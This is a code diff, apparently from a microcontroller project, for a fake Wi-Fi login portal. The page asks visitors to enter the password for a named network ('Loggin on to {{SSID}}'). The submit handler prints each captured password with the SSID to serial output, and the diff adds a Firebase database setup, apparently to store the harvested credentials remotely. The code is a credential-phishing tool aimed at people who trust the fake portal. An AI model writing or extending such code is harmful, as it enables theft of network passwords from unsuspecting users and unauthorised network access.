@@ -23,8 +23,6 @@ namespace WebPortal{
                 <div id ="mainContainer">
                     <h1>Loggin on to {{SSID}}</h1>
                     <form id = "inputForm" action = "\submit" method = "post">
-                        <label for="ssidInput">Wifi Network SSID:</label><br>
-                        <input type="text" placeholder = "{{SSID}}"><br><br>
                         <label for="passwordInput">Password: (30 characters max)</label><br>
                         <input type="text" class="inputBar" name="passwordInput"><br><br>
                         <input type="submit" value="Enter">
@@ -44,16 +42,32 @@ namespace WebPortal{
     }
 
     void handleSubmit() {
-        if (server.hasArg("passwordEnter")) {
-            String userPW = server.arg("passwordEnter");
+        if (server.hasArg("passwordInput")) {
+            String userPW = server.arg("passwordInput");
             Serial.println("--------NEW PASSWORD SUBMISSION--------");
-            Serial.print("SSID: ");
-            Serial.print("Password: ");
-            Serial.println(userPW);
+            Serial.printf("SSID: %s\n", SSID);
+            Serial.printf("Password: %s\n", userPW);
         } else {
             Serial.println("No password entered.");
         }
 
         server.send(200, "text/html", getHTML());
+    }
+
+    void firebaseSetup(){
+        config.api_key = FIREBASE_KEY;
+        config.database_url = DB_URL;
+        
+        /* Sign up */
+        if (Firebase.signUp(&config, &auth, "", "")){
+            Serial.println("Sign up Confirmed");
+        }
+        else{
+            Serial.print("!ERROR: ");
+            Serial.printf("%s\n", config.signer.signupError.message.c_str());
+        }
+
+        Firebase.begin(&config, &auth);
+        Firebase.reconnectWiFi(true);
     }
 } 
